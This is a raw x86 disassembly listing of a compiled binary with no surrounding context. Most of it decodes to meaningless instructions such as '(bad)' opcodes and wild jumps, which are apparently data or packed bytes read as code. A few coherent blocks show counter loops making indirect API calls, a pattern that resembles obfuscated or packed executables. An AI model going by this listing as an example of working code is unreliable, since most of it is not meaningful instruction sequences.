  4074bc:	jg     0x4074ee
  4074be:	sahf   
  4074bf:	mov    bh,0x50
  4074c1:	xchg   edi,eax
  4074c2:	xor    BYTE PTR [eax],al
  4074c4:	repz dec ebx
  4074c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4074c7:	jecxz  0x407479
  4074c9:	push   edi
  4074ca:	in     al,0x6f
  4074cc:	pop    es
  4074cd:	jne    0x407528
  4074cf:	pop    es
  4074d0:	sbb    al,0x5c
  4074d2:	fiadd  WORD PTR [edi-0x7a]
  4074d5:	mov    edi,0xa2bc8f3f
  4074da:	jp     0x4074b7
  4074dc:	minps  xmm7,XMMWORD PTR [edi-0x22]
  4074e0:	out    dx,eax
  4074e1:	cmp    DWORD PTR ds:0x594437a6,esi
  4074e7:	mov    ds:0x8a3319b3,al
  4074ec:	(bad)  
  4074ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4074ef:	push   0x8b2c5520
  4074f4:	out    dx,al
  4074f5:	inc    ebx
  4074f6:	inc    edx
  4074f7:	adc    edi,DWORD PTR [ecx+0x42]
  4074fa:	cmp    al,BYTE PTR [edx-0x48]
  4074fd:	sub    al,0x43
  4074ff:	mov    edi,0x2ac5ae71
  407504:	sbb    ecx,edi
  407506:	sub    DWORD PTR [edi],edi
  407508:	add    al,0xcf
  40750a:	aas    
  40750b:	cld    
  40750c:	popf   
  40750d:	fs in  al,0x7a
  407510:	sub    edx,eax
  407512:	jo     0x40754a
  407514:	(bad)  
  407515:	xchg   ecx,eax
  407516:	adc    eax,0xd6cf091e
  40751b:	(bad)  
  40751c:	iret   
  40751d:	lods   eax,DWORD PTR ds:[esi]
  40751e:	adc    BYTE PTR [edi+0x5e8708d1],cl
  407524:	out    dx,al
  407525:	js     0x40758b
  407527:	mov    ah,0x81
  407529:	pop    esi
  40752a:	imul   edi,edi,0xcf643a5b
  407530:	jmp    0x407535
  407532:	push   0xffffff9c
  407534:	jge    0x40753f
  407536:	mov    edx,0xf92f853b
  40753b:	pusha  
  40753c:	inc    esi
  40753d:	fcom   QWORD PTR [ebx+0x1c6555eb]
  407543:	mov    dh,BYTE PTR [eax+0x77548201]
  407549:	ds mov ebp,0x112dd900
  40754f:	pop    edi
  407550:	aam    0xab
  407552:	jp     0x4074f3
  407554:	xchg   ebp,eax
  407555:	fadd   QWORD PTR [edi+0x4d]
  407558:	(bad)  
  40755b:	mov    dh,0x92
  40755d:	push   0x1a
  40755f:	bound  esp,QWORD PTR [ebx+0x6c29936d]
  407565:	pmullw mm5,QWORD PTR [edx-0x2a]
  407569:	ins    DWORD PTR es:[edi],dx
  40756a:	adc    cl,BYTE PTR [edx+eax*8]
  40756d:	jl     0x4075d2
  40756f:	add    al,0x38
  407571:	jae    0x407582
  407573:	sub    BYTE PTR [esi+edx*2-0x647bed3f],ch
  40757a:	out    dx,al
  40757b:	mov    ah,0x71
  40757d:	jae    0x4075c8
  40757f:	and    ah,dh
  407581:	out    dx,al
  407582:	fs add eax,0x3edcc8a7
  407588:	fimul  DWORD PTR [edi+0x75]
  40758b:	(bad)  
  40758c:	mov    gs,WORD PTR [ecx]
  40758e:	inc    esp
  40758f:	in     al,dx
  407590:	add    DWORD PTR [ebx],ebx
  407592:	aas    
  407593:	sub    al,0x6a
  407595:	es fwait
  407597:	cs ss dec ecx
  40759a:	retf   0x6f0a
  40759d:	clc    
  40759e:	xchg   ebp,eax
  40759f:	shl    BYTE PTR [edi],1
  4075a1:	dec    edx
  4075a2:	mov    ecx,0xf2f96949
  4075a7:	das    
  4075a8:	pop    es
  4075a9:	ss mov bl,0x8a
  4075ac:	in     eax,dx
  4075ad:	retf   0x73bc
  4075b0:	push   esi
  4075b1:	xlat   BYTE PTR ds:[ebx]
  4075b2:	aam    0xce
  4075b4:	push   ss
  4075b5:	push   0x16
  4075b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4075b8:	test   eax,0x993c5014
  4075bd:	dec    ecx
  4075be:	mov    eax,0x5c41f11a
  4075c3:	loope  0x4075e0
  4075c5:	bound  eax,QWORD PTR [eax+0x65]
  4075c8:	mov    edi,0xeca89b35
  4075cd:	jmp    0x7b1f14a2
  4075d2:	jo     0x4075b3
  4075d4:	xor    BYTE PTR [eax],cl
  4075d6:	pop    edi
  4075d7:	mov    esp,?
  4075d9:	pushf  
  4075da:	shl    BYTE PTR [esi+0x4],0x14
  4075de:	push   esi
  4075df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4075e0:	xchg   DWORD PTR [edi-0x75],esi
  4075e3:	sti    
  4075e4:	pop    ds
  4075e5:	inc    esi
  4075e6:	push   0x6e00280
  4075eb:	sub    BYTE PTR [edx-0x10],cl
  4075ee:	pop    es
  4075ef:	sbb    eax,0xfe29a42e
  4075f4:	jmp    0xbce7:0x5a858840
  4075fb:	mov    ebp,DWORD PTR [ebx+eax*8]
  4075fe:	add    eax,0x6391dcc2
  407603:	in     al,dx
  407604:	mov    esi,0x3d2b0f6e
  407609:	retf   0x140
  40760c:	and    al,0x75
  40760e:	fmul   DWORD PTR [edx]
  407610:	lock sbb ah,BYTE PTR [ebp+0x4faa2d40]
  407617:	test   al,0x53
  407619:	lock std 
  40761b:	jl     0x407650
  40761d:	je     0x40910e
  407623:	push   ebx
  407624:	jmp    0x408d87
  407629:	and    DWORD PTR ds:0x42ec4b,0x0
  407633:	jmp    0x407647
  407638:	xor    edx,edx
  40763a:	xor    edx,DWORD PTR ds:0x42ec4b
  407640:	inc    edx
  407641:	mov    DWORD PTR ds:0x42ec4b,edx
  407647:	cmp    DWORD PTR ds:0x42ec4b,0x1b
  40764e:	jae    0x40768b
  407654:	cmp    DWORD PTR ds:0x42ec4b,0xa
  40765b:	jne    0x40766a
  407661:	push   DWORD PTR [ebp-0x10]
  407664:	call   DWORD PTR ds:0x42e933
  40766a:	cmp    DWORD PTR ds:0x42ec4b,0x9
  407671:	jne    0x407686
  407677:	xor    edx,edx
  407679:	xor    edx,DWORD PTR ds:0x42ec4b
  40767f:	inc    edx
  407680:	mov    DWORD PTR ds:0x42ec4b,edx
  407686:	jmp    0x407638
  40768b:	mov    edx,DWORD PTR [ebp-0x8]
  40768e:	mov    edi,DWORD PTR [ebp-0x10]
  407691:	sub    edi,edx
  407693:	jmp    0x407844
  407698:	or     DWORD PTR [ecx+0x67a86788],ebp
  40769e:	icebp  
  40769f:	jno    0x407690
  4076a1:	out    dx,al
  4076a2:	jns    0x4076bb
  4076a4:	imul   ebp,DWORD PTR [ecx-0x6d],0x7ec24198
  4076ab:	jle    0x407637
  4076ad:	jg     0x40772d
  4076af:	jle    0x4076b7
  4076b1:	arpl   dx,si
  4076b3:	push   ss
  4076b4:	fisubr WORD PTR [ebx-0x5d37af0b]
  4076ba:	mov    ebx,0x44c16a91
  4076bf:	mov    ecx,0xdc575683
  4076c4:	aaa    
  4076c5:	push   ebx
  4076c6:	das    
  4076c7:	loope  0x407744
  4076c9:	pop    eax
  4076ca:	jp     0x407723
  4076cc:	aaa    
  4076cd:	rcl    BYTE PTR ds:[esi+0x39c72818],cl
  4076d4:	aam    0x48
  4076d6:	sbb    ebx,ebp
  4076d8:	rol    bh,1
  4076da:	or     eax,edx
  4076dc:	call   0x2f0b2405
  4076e1:	inc    edi
  4076e2:	and    DWORD PTR [edi],edx
  4076e4:	inc    ebx
  4076e5:	cmp    BYTE PTR [ebp+0x4d],dh
  4076e8:	cli    
  4076e9:	jg     0x4076ce
  4076eb:	shl    BYTE PTR [ebx-0x2555dd4],1
  4076f1:	cmp    DWORD PTR [ebp+0x505ab49d],ebx
  4076f7:	not    DWORD PTR [ebx-0x17ca46f7]
  4076fd:	inc    edx
  4076fe:	mov    eax,ds:0x72dbe2aa
  407703:	popa   
  407704:	mov    ch,BYTE PTR [eax-0x156dd477]
  40770a:	daa    
  40770b:	mov    esi,0x1479a177
  407710:	dec    BYTE PTR [esi+edi*8+0x1628a82a]
  407717:	(bad)
  40771a:	gs stos BYTE PTR es:[edi],al
  40771c:	int3   
  40771d:	shr    ecx,0x51
  407720:	xchg   bh,dl
  407722:	fdiv   st,st(3)
  407724:	js     0x4076bd
  407726:	mov    ah,0x30
  407728:	mov    esi,0xb0f1df38
  40772d:	call   0xf12acd63
  407732:	sbb    ebp,DWORD PTR ss:[eax+edi*4]
  407736:	punpckhbw mm0,QWORD PTR [eax-0x24]
  40773a:	repz sbb edx,DWORD PTR [edi-0x63049721]
  407741:	or     al,0x12
  407743:	pop    ecx
  407744:	dec    eax
  407745:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407746:	into   
  407747:	aad    0xe1
  407749:	cmp    al,0x7d
  40774b:	or     ch,BYTE PTR [edx+eiz*1]
  40774e:	cld    
  40774f:	call   DWORD PTR [ebx-0x61]
  407752:	rol    BYTE PTR [eax-0x2fff6978],0x9e
  407759:	and    BYTE PTR [eax+eiz*4],0x63
  40775d:	call   0xd28dcd50
  407762:	out    0x9,eax
  407764:	sbb    DWORD PTR [eax],eax
  407766:	popf   
  407767:	nop
  407768:	loopne 0x407768
  40776a:	test   bh,al
  40776c:	mov    ah,0xa
  40776e:	pop    edi
  40776f:	ins    BYTE PTR es:[edi],dx
  407770:	xor    al,0x32
  407772:	xchg   ecx,eax
  407773:	xchg   DWORD PTR [ecx+0x4f8c51d2],ebx
  407779:	je     0x407716
  40777b:	pop    ecx
  40777c:	mov    al,0xda
  40777e:	pop    edx
  40777f:	cmp    al,0x42
  407781:	xor    al,0x71
  407783:	aad    0x3f
  407785:	mov    ?,esp
  407787:	retf   0x2a86
  40778a:	jp     0x407788
  40778c:	stos   BYTE PTR es:[edi],al
  40778d:	jns    0x407804
  40778f:	std    
  407790:	xchg   ebp,eax
  407791:	jno    0x40779a
  407793:	or     eax,0xf9f89175
  407798:	xchg   DWORD PTR [ebx+0x608569d9],ebx
  40779e:	inc    ebx
  40779f:	cmp    BYTE PTR [edi+0x4dfd0e55],dh
  4077a5:	adc    ebp,ecx
  4077a7:	mov    bh,0x49
  4077a9:	ror    BYTE PTR [ebx+esi*1+0x4f],cl
  4077ad:	les    ebp,FWORD PTR [esi+0x27f81dc4]
  4077b3:	stos   DWORD PTR es:[edi],eax
  4077b4:	pop    esi
  4077b5:	xchg   esi,eax
  4077b6:	push   ss
  4077b7:	shr    DWORD PTR [esi+edi*4+0x33],cl
  4077bb:	sub    BYTE PTR [esi],0x2b
  4077be:	cli    
  4077bf:	xchg   edi,eax
  4077c0:	lahf   
  4077c1:	xor    DWORD PTR [edi-0x3fec6f62],ebx
  4077c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4077c8:	test   DWORD PTR [esp+edi*2+0x48dac66e],edx
  4077cf:	fimul  WORD PTR [ebp-0x69b3e3a]
  4077d5:	sub    DWORD PTR [edx-0x3fa1ded0],ebx
  4077db:	sub    bh,BYTE PTR [edi+0x20f80c0f]
  4077e1:	xchg   esi,eax
  4077e2:	xchg   DWORD PTR [ebp-0x7f],edi
  4077e5:	aas    
  4077e6:	mov    DWORD PTR [edi],eax
  4077e8:	dec    ebp
  4077e9:	cdq    
  4077ea:	jp     0x4077d8
  4077ec:	or     al,0x6a
  4077ee:	iret   
  4077ef:	inc    esi
  4077f0:	repnz mov eax,ds:0x76830791
  4077f6:	sub    al,0x2b
  4077f8:	lods   eax,DWORD PTR ds:[esi]
  4077f9:	or     ah,al
  4077fb:	fs jns 0x4077d3
  4077fe:	dec    ecx
  4077ff:	fbld   TBYTE PTR [ecx+0x18]
  407802:	cmp    edx,DWORD PTR [ebx]
  407804:	fisubr DWORD PTR [esi+0x14]
  407807:	cmp    DWORD PTR [esi+0x78],ecx
  40780a:	mov    dh,0xd3
  40780c:	jmp    DWORD PTR [edx+0x3e]
  40780f:	cmp    eax,0x980dded
  407814:	pop    ebp
  407815:	dec    esi
  407816:	push   esp
  407817:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407818:	dec    edi
  407819:	or     eax,0x64c28e05
  40781e:	and    DWORD PTR [eax],esi
  407820:	mov    DWORD PTR [ebx+edx*4+0x60b86722],edx
  407827:	mov    al,ds:0x1ebe1752
  40782c:	inc    esi
  40782d:	mov    ecx,0xff362b74
  407832:	int3   
  407833:	cmp    ch,al
  407835:	ins    BYTE PTR es:[edi],dx
  407836:	pop    ebp
  407837:	out    dx,eax
  407838:	in     eax,dx
  407839:	(bad)  
  40783a:	or     BYTE PTR [eax],ch
  40783c:	ret    0x3cd5
  40783f:	push   edi
  407840:	sub    al,0xb6
  407842:	repz loope 0x4077d0
  407845:	push   ebp
  407846:	cld    
  407847:	adc    DWORD PTR ds:0x4302c9,0x43034f
  407851:	xor    edx,eax
  407853:	add    edx,ecx
  407855:	cmp    edi,edx
  407857:	mov    DWORD PTR ds:0x4302ed,0x688e
  407861:	jb     0x40910d
  407867:	mov    DWORD PTR ds:0x42e644,0x1e
  407871:	cmp    DWORD PTR ds:0x42e644,0x0
  407878:	je     0x4078a9
  40787e:	cmp    DWORD PTR ds:0x42e644,0x25
  407885:	jne    0x407896
  40788b:	push   0x2141
  407890:	call   DWORD PTR ds:0x42e937
  407896:	mov    edi,DWORD PTR ds:0x42e644
  40789c:	dec    edi
  40789d:	mov    DWORD PTR ds:0x42e644,edi
  4078a3:	jmp    0x407871
  4078a8:	inc    edx
  4078a9:	mov    edx,DWORD PTR [ebp-0x28]
  4078ac:	mov    edi,DWORD PTR [ebp-0x4]
  4078af:	xor    edx,eax
  4078b1:	xor    edi,eax
  4078b3:	sub    ebx,DWORD PTR ds:0x42ec4f
  4078b9:	add    edi,ecx
  4078bb:	add    edx,ecx
  4078bd:	and    DWORD PTR ds:0x4302bd,0x0
  4078c7:	xor    ebx,ebx
  4078c9:	or     ebx,DWORD PTR ds:0x4302bd
  4078cf:	inc    ebx
  4078d0:	mov    DWORD PTR ds:0x4302bd,ebx
  4078d6:	cmp    DWORD PTR ds:0x4302bd,0x15
  4078dd:	jne    0x4078f1
  4078e3:	push   0x1
  4078e5:	push   DWORD PTR [ebp-0x20]
  4078e8:	push   DWORD PTR [ebp-0x10]
  4078eb:	call   DWORD PTR ds:0x42eaa7
  4078f1:	cmp    DWORD PTR ds:0x4302bd,0x11
  4078f8:	jb     0x4078c7
  4078fe:	imul   edx,edi
  407901:	mov    edi,DWORD PTR [ebp-0x8]
  407904:	mov    ebx,DWORD PTR [ebp-0x10]
  407907:	sub    ebx,edi
  407909:	cmp    ebx,edx
  40790b:	ja     0x40791d
  407911:	mov    edx,DWORD PTR [ebp-0x4]
  407914:	xor    edx,eax
  407916:	add    edx,ecx
  407918:	jmp    0x40877e
  40791d:	mov    edx,DWORD PTR [ebp-0x2c]
  407920:	mov    edi,DWORD PTR [ebp-0x4]
  407923:	xor    edx,eax
  407925:	xor    edi,eax
  407927:	add    edi,ecx
  407929:	add    edx,ecx
  40792b:	imul   edx,edi
  40792e:	mov    edi,DWORD PTR [ebp-0x8]
  407931:	jmp    0x407ae2
  407936:	ret    0x1100
  407939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40793a:	shl    DWORD PTR [ebp+0x7ad26172],1
  407940:	dec    edi
  407941:	(bad)  
  407942:	sti    
  407943:	jae    0x40795d
  407945:	rcr    ebp,cl
  407947:	sar    BYTE PTR [esi+0x7e],0x8a
  40794b:	jg     0x4079cb
  40794d:	jle    0x40795f
  40794f:	sar    DWORD PTR [eax],1
  407951:	add    eax,0xd2f537db
  407956:	pop    esp
  407957:	mov    WORD PTR [eax+0x14],gs
  40795a:	jp     0x407982
  40795c:	add    bl,BYTE PTR fs:[ebx+0xd]
  407960:	popa   
  407961:	mov    cl,BYTE PTR [ebx-0x3777d606]
  407967:	mov    ebp,0xaa615fff
  40796c:	add    DWORD PTR [ecx],ebx
  40796e:	jnp    0x4079c9
  407970:	out    dx,eax
  407971:	adc    BYTE PTR [eax-0x4c57b72c],bh
  407977:	push   0x2e11e2fc
  40797c:	arpl   WORD PTR [ebx-0x62c3f180],cx
  407982:	sub    DWORD PTR [eax-0x60],ebx
  407985:	jae    0x407976
  407987:	jmp    0xf548:0x1124f6f6
  40798e:	test   eax,0xa604c15c
  407993:	lahf   
  407994:	clc    
  407995:	sbb    eax,0x515d03e4
  40799a:	out    dx,eax
  40799b:	and    al,BYTE PTR [esi+0x5220ca77]
  4079a1:	sbb    eax,0xebcbac2d
  4079a6:	xchg   edi,eax
  4079a7:	pop    es
  4079a8:	sbb    BYTE PTR [edi],ah
  4079aa:	mov    DWORD PTR [ebx+0x1b97cf08],ebx
  4079b0:	sbb    eax,0x376b6e2
  4079b5:	hlt    
  4079b6:	out    dx,eax
  4079b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4079b8:	push   esi
  4079b9:	mov    ebx,0x470f44
  4079be:	outs   dx,BYTE PTR ds:[esi]
  4079bf:	push   0xfffffffb
  4079c1:	inc    ebx
  4079c2:	lds    edx,FWORD PTR [ecx-0x2b]
  4079c5:	cmp    al,0x8c
  4079c7:	jae    0x4079b3
  4079c9:	jns    0x407989
  4079cb:	scas   al,BYTE PTR es:[edi]
  4079cc:	sub    ch,al
  4079ce:	(bad)  
  4079cf:	and    BYTE PTR [esi-0x3dacc048],0xe2
  4079d6:	mov    ah,0xb8
  4079d8:	sub    DWORD PTR [ecx],eax
  4079da:	retf   
  4079db:	shl    DWORD PTR [eax+0x4e],1
  4079de:	mov    edi,?
  4079e0:	dec    ebx
  4079e1:	ds adc cl,0x55
  4079e5:	and    BYTE PTR [ebp+0x75518aaa],0x16
  4079ec:	dec    esi
  4079ed:	ins    DWORD PTR es:[edi],dx
  4079ee:	push   ss
  4079ef:	add    eax,0x9428e0e9
  4079f4:	into   
  4079f5:	(bad)  
  4079f6:	mov    ch,0xf7
  4079f8:	aad    0x1a
  4079fa:	(bad)  
  4079fb:	or     ebp,ebx
  4079fd:	adc    cl,BYTE PTR [esi-0x31f5864a]
  407a03:	jnp    0x407a20
  407a05:	dec    ebp
  407a06:	out    dx,eax
  407a07:	sub    edx,edx
  407a09:	ins    BYTE PTR es:[edi],dx
  407a0a:	inc    ebx
  407a0b:	mov    dl,BYTE PTR [ecx+esi*8+0x19]
  407a0f:	and    DWORD PTR [edx],0x9e765337
  407a15:	add    bh,BYTE PTR [esi+0x6d]
  407a18:	sbb    DWORD PTR [edi+0xf],0xa
  407a1c:	fcom   QWORD PTR [edi]
  407a1e:	push   esi
  407a1f:	pushf  
  407a20:	mov    ah,0x97
  407a22:	pop    esi
  407a23:	scas   eax,DWORD PTR es:[edi]
  407a24:	cmp    eax,0x327085b3
  407a29:	nop
  407a2a:	add    BYTE PTR [edx+0x5a32603f],dh
  407a30:	pop    ecx
  407a31:	(bad)  
  407a32:	es dec esi
  407a34:	fist   DWORD PTR [ebp+0x2d69302b]
  407a3a:	cs dec ebp
  407a3c:	inc    eax
  407a3d:	pop    eax
  407a3e:	stos   DWORD PTR es:[edi],eax
  407a3f:	xlat   BYTE PTR ds:[ebx]
  407a40:	lea    esi,[esi+0x3e4ca462]
  407a46:	pop    ecx
  407a47:	mov    al,ds:0xa2648772
  407a4c:	xor    DWORD PTR ds:[esi],edi
  407a4f:	push   0x21
  407a51:	jmp    0x407a64
  407a53:	stc    
  407a54:	jnp    0x407a22
  407a56:	leave  
  407a57:	loopne 0x407aa8
  407a59:	cmp    esi,0xd316cb43
  407a5f:	mov    cl,0x7e
  407a61:	or     BYTE PTR cs:[ecx+edx*4],al
  407a65:	stos   BYTE PTR es:[edi],al
  407a66:	test   esp,edx
  407a68:	ins    BYTE PTR es:[edi],dx
  407a69:	int    0x35
  407a6b:	mov    ch,0x19
  407a6d:	sbb    al,BYTE PTR [ecx]
  407a6f:	inc    eax
  407a70:	mov    al,0xc6
  407a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a73:	jbe    0x407a13
  407a75:	and    BYTE PTR [ebp+esi*8+0x123284ef],dl
  407a7c:	call   0x2422fe0e
  407a81:	lods   eax,DWORD PTR ds:[esi]
  407a82:	mov    dl,0x89
  407a84:	jecxz  0x407afa
  407a86:	hlt    
  407a87:	mov    edi,0x890c573d
  407a8c:	mov    esi,0x48da8225
  407a91:	and    DWORD PTR [ecx+0x1b992cdd],esi
  407a97:	push   eax
  407a98:	daa    
  407a99:	push   edx
  407a9a:	addr16 dec esp
  407a9c:	es mov bl,0xd0
  407a9f:	stos   BYTE PTR es:[edi],al
  407aa0:	retf   0x7a10
  407aa3:	retf   0x88a4
  407aa6:	mov    dl,0x45
  407aa8:	adc    eax,0xcd6a9ac2
  407aad:	and    ah,dh
  407aaf:	ficomp WORD PTR [eax+0x32]
  407ab2:	sti    
  407ab3:	inc    esi
  407ab4:	ret    0x5b98
  407ab7:	xor    DWORD PTR [ebp+0x765af52c],edi
  407abd:	or     DWORD PTR [eax+0x43],ebp
  407ac0:	xchg   DWORD PTR [ebp+0x77d7a5b0],esp
  407ac6:	cmp    cl,BYTE PTR [eax]
  407ac8:	add    cl,BYTE PTR [ecx]
  407aca:	pop    esp
  407acb:	sub    BYTE PTR [ebp+0x78cbc05a],0x29
  407ad2:	(bad)  
  407ad3:	xchg   ecx,eax
  407ad4:	scas   eax,DWORD PTR es:[edi]
  407ad5:	popf   
  407ad6:	inc    eax
  407ad7:	retf   0x1cb0
  407ada:	mov    eax,ds:0xab3dcd3b
  407adf:	sub    al,0x90
  407ae1:	bound  ecx,QWORD PTR [ebx-0x20d40fa3]
  407ae7:	cmp    ebx,edx
  407ae9:	ja     0x407af7
  407aef:	mov    edx,DWORD PTR [ebp-0x28]
  407af2:	jmp    0x408770
  407af7:	mov    edx,DWORD PTR [ebp-0x30]
  407afa:	mov    edi,DWORD PTR [ebp-0x4]
  407afd:	jmp    0x407cae
  407b02:	mov    WORD PTR [edx+0x6130bf0c],?
  407b08:	dec    ebp
  407b09:	jno    0x407ae6
  407b0b:	les    ecx,FWORD PTR [esi+0xbbe1fca]
  407b11:	adc    eax,0x7e7ec169
  407b16:	mov    bh,BYTE PTR [edi+0x7e]
  407b19:	jle    0x407b6c
  407b1b:	ss jle 0x407b39
  407b1e:	jp     0x407b0a
  407b20:	inc    edi
  407b21:	pop    ebp
  407b22:	pop    es
  407b23:	sbb    dl,BYTE PTR [eax+0x1157ba9b]
  407b29:	test   DWORD PTR [eax],eax
  407b2b:	imul   ah
  407b2d:	ins    BYTE PTR es:[edi],dx
  407b2e:	or     bl,0x8d
  407b31:	bound  edx,QWORD PTR [ebp+0x5b8e6e8c]
  407b37:	push   edx
  407b38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b39:	push   ecx
  407b3a:	xor    al,0x59
  407b3c:	sbb    cl,BYTE PTR [eax-0xf]
  407b3f:	pop    edi
  407b41:	pop    esp
  407b42:	pop    esp
  407b43:	bound  ebp,QWORD PTR [edi+0x2d6a6d6]
  407b49:	fst    QWORD PTR [edx]
  407b4b:	stos   BYTE PTR es:[edi],al
  407b4c:	hlt    
  407b4d:	(bad)  
  407b4e:	test   eax,0x2024ef41
  407b53:	rcr    DWORD PTR [edx+eax*8],0xee
  407b57:	inc    edi
  407b58:	dec    esi
  407b59:	mov    edi,0xd1b68108
  407b5e:	fadd   st(1),st
  407b60:	dec    edx
  407b61:	(bad)  
  407b62:	and    eax,0x14cd8600
  407b67:	sub    ebp,DWORD PTR [ebp+0x69]
  407b6a:	and    eax,0x8e881062
  407b6f:	adc    DWORD PTR [esi],edx
  407b71:	xchg   ebp,eax
  407b72:	rcl    DWORD PTR [ecx],1
  407b74:	sub    BYTE PTR [ebx-0x8],bh
  407b77:	lods   al,BYTE PTR ds:[esi]
  407b78:	stc    
  407b79:	scas   eax,DWORD PTR es:[edi]
  407b7a:	stc    
  407b7b:	xchg   BYTE PTR [ebx-0x6522ec00],ah
  407b81:	fsubp  st(4),st
  407b83:	xor    eax,0x2d65a050
  407b88:	bound  edi,QWORD PTR [esi]
  407b8a:	adc    ah,BYTE PTR [edx-0x72]
  407b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b8e:	jl     0x407bf5
  407b90:	cmp    dl,BYTE PTR [ebx]
  407b92:	rcl    ah,0xf
  407b95:	inc    esi
  407b96:	xor    eax,0xb5c39fe0
  407b9b:	repz jecxz 0x407bd4
  407b9e:	arpl   WORD PTR [edx-0x1b00dcdb],ax
  407ba4:	jle    0x407bbf
  407ba6:	push   edi
  407ba7:	popa   
  407ba8:	ret    0xf29d
  407bab:	mov    esp,0x4ee340ff
  407bb0:	enter  0xac02,0x56
  407bb4:	xchg   edi,eax
  407bb5:	outs   dx,BYTE PTR ds:[esi]
  407bb6:	jmp    0x48d7324b
  407bbb:	ror    esp,0xfe
  407bbe:	mov    dl,BYTE PTR [eax]
  407bc0:	mov    bl,0x6f
  407bc2:	and    eax,0x2cc364b0
  407bc7:	lock retf 
  407bc9:	pop    edx
  407bca:	(bad)  
  407bcb:	loopne 0x407c17
  407bcd:	leave  
  407bce:	ins    DWORD PTR es:[edi],dx
  407bcf:	xchg   ebx,eax
  407bd0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bd1:	pop    DWORD PTR ds:[eax]
  407bd4:	test   eax,0x59e5eafd
  407bd9:	int3   
  407bda:	push   0xffffffaf
  407bdc:	xchg   ebp,eax
  407bdd:	in     al,0xc
  407bdf:	les    ebx,FWORD PTR [eax+0x2f42341]
  407be5:	popf   
  407be6:	jnp    0x407bf7
  407be8:	jbe    0x407c15
  407bea:	dec    eax
  407beb:	aaa    
  407bec:	enter  0xb602,0xe4
  407bf0:	jo     0x407c70
  407bf2:	loope  0x407b97
  407bf4:	xchg   esp,eax
  407bf5:	inc    edi
  407bf6:	mov    dh,0xfd
  407bf8:	jns    0x407b84
  407bfa:	pop    ds
  407bfb:	aas    
  407bfc:	sub    eax,0x2a500dd5
  407c01:	mov    dl,0xe6
  407c03:	mov    edi,0x212d7377
  407c08:	jge    0x407c45
  407c0a:	shl    dl,cl
  407c0c:	adc    DWORD PTR [edi+esi*2+0x7ec28c24],ecx
  407c13:	(bad)  
  407c14:	jmp    0x407ba0
  407c16:	(bad)  
  407c17:	xchg   ebp,eax
  407c18:	std    
  407c19:	popa   
  407c1a:	imul   esp,ebp,0x4d
  407c1d:	in     eax,dx
  407c1e:	pop    esp
  407c1f:	mov    bh,0xd
  407c21:	jo     0x407bef
  407c23:	sub    eax,0xaa7f79ce
  407c28:	mov    edx,0xc9fafdf1
  407c2d:	cmp    DWORD PTR [edx+0x39],eax
  407c30:	cld    
  407c31:	jecxz  0x407bde
  407c33:	mov    edx,0xcf94c0b2
  407c38:	outs   dx,DWORD PTR ds:[esi]
  407c39:	into   
  407c3a:	or     edi,DWORD PTR [ebp-0x34]
  407c3d:	dec    edx
  407c3e:	ins    DWORD PTR es:[edi],dx
  407c3f:	add    eax,0xf25c80fd
  407c44:	daa    
  407c45:	fnsave [ebp+0x13]
  407c48:	test   DWORD PTR [ebp+esi*2+0x4c],esp
  407c4c:	pop    ebp
  407c4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407c4e:	xchg   esp,eax
  407c4f:	pop    ds
  407c50:	sbb    al,0x14
  407c52:	mov    bh,0x98
  407c54:	cmp    ah,BYTE PTR [esi+0x3d]
  407c57:	aad    0xd5
  407c59:	aas    
  407c5a:	xchg   ebp,eax
  407c5b:	inc    edi
  407c5c:	xchg   ebp,eax
  407c5d:	mov    al,0x8d
  407c5f:	stos   DWORD PTR es:[edi],eax
  407c60:	xchg   edx,eax
  407c61:	push   ebp
  407c62:	xor    eax,0xaecefa7
  407c67:	pop    ebx
  407c68:	xchg   ebp,eax
  407c69:	adc    edx,DWORD PTR [ebx-0x13ca3162]
  407c6f:	shl    cl,1
  407c71:	push   ss
  407c72:	aad    0xde
  407c74:	lods   al,BYTE PTR ds:[esi]
  407c75:	ret    0xdf2c
  407c78:	xor    DWORD PTR [edi+esi*1-0xfb9c3df],eax
  407c7f:	xchg   ebx,eax
  407c80:	xor    eax,0x9125b757
  407c85:	mov    ch,0x9
  407c87:	inc    edi
  407c88:	pop    ebp
  407c89:	push   ebp
  407c8a:	jnp    0x407c19
  407c8c:	ins    BYTE PTR es:[edi],dx
  407c8d:	adc    eax,0x62219b8d
  407c92:	mov    DWORD PTR [esi-0x307e502a],esi
  407c98:	sub    eax,0x26fc3069
  407c9d:	ret    
  407c9e:	adc    esp,esp
  407ca0:	xchg   ebx,eax
  407ca1:	jge    0x407ca4
  407ca3:	(bad)  [edx+0xf]
  407ca6:	mov    dl,0x2d
  407ca8:	call   0x10fc4799
  407cad:	lock xor edx,eax
  407cb0:	xor    edi,eax
  407cb2:	add    edi,ecx
  407cb4:	add    edx,ecx
  407cb6:	imul   edx,edi
  407cb9:	mov    edi,DWORD PTR [ebp-0x8]
  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x414b875c]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407cfa
  407ce1:	(bad)  
  407ce2:	push   edx
  407ce3:	push   0xffffff8b
  407ce5:	xchg   DWORD PTR [edx+0x7e],esp
  407ce8:	and    DWORD PTR [esi+0x227bfcee],ebp
  407cee:	mov    ds:0x5334fc87,eax
  407cf3:	cmp    BYTE PTR [esi-0x19],bh
  407cf6:	sahf   
